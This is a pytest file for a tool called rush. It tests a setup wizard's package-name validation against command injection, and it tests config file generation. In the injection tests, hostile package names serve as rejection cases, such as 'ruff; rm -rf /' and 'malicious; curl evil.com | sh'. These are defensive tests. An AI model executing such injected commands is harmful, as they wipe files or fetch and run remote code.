"""Tests for Phase 23: Setup Wizard and Config Initializer.

Verifies:
- Command injection neutralization in package installation
- Package name regex sanitization (rejection of shell metacharacters)
- Generating rush.toml configuration files
- Validating configuration files via config check
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

import pytest

from rush.config import load_config
from rush.tools.init_config import generate_initial_config
from rush.tools.setup_wizard import (
    PACKAGE_NAME_REGEX,
    install_engine_package,
)


def test_package_name_regex_sanitization() -> None:
    # Valid package names
    assert PACKAGE_NAME_REGEX.match("ruff")
    assert PACKAGE_NAME_REGEX.match("@biomejs/biome")
    assert PACKAGE_NAME_REGEX.match("eslint-plugin-react")
    assert PACKAGE_NAME_REGEX.match("pytest_mock")

    # Hostile / injection package names
    assert not PACKAGE_NAME_REGEX.match("ruff; rm -rf /")
    assert not PACKAGE_NAME_REGEX.match("ruff && calc.exe")
    assert not PACKAGE_NAME_REGEX.match("`whoami`")
    assert not PACKAGE_NAME_REGEX.match("pkg | bash")
    assert not PACKAGE_NAME_REGEX.match("pkg > output.txt")


def test_install_engine_package_rejection(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="Invalid or hostile package name"):
        install_engine_package("npm", "malicious; curl evil.com | sh", cwd=tmp_path)


def test_install_engine_package_mock(tmp_path: Path) -> None:
    import subprocess

    with patch(
        "rush.tools.setup_wizard.run_subprocess",
        return_value=subprocess.CompletedProcess(
            args=[], returncode=0, stdout="installed", stderr=""
        ),
    ):
        success = install_engine_package("uv", "ruff", cwd=tmp_path)
        assert success is True


def test_generate_initial_config(tmp_path: Path) -> None:
    # Create Python project markers
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="demo"\n', encoding="utf-8"
    )

    cfg_text = generate_initial_config(tmp_path)
    assert "[project]" in cfg_text
    assert "src" in cfg_text

    # Write and load to verify parse validity
    cfg_file = tmp_path / "rush.toml"
    cfg_file.write_text(cfg_text, encoding="utf-8")

    parsed = load_config(tmp_path)
    assert parsed.project.src == ["src"]
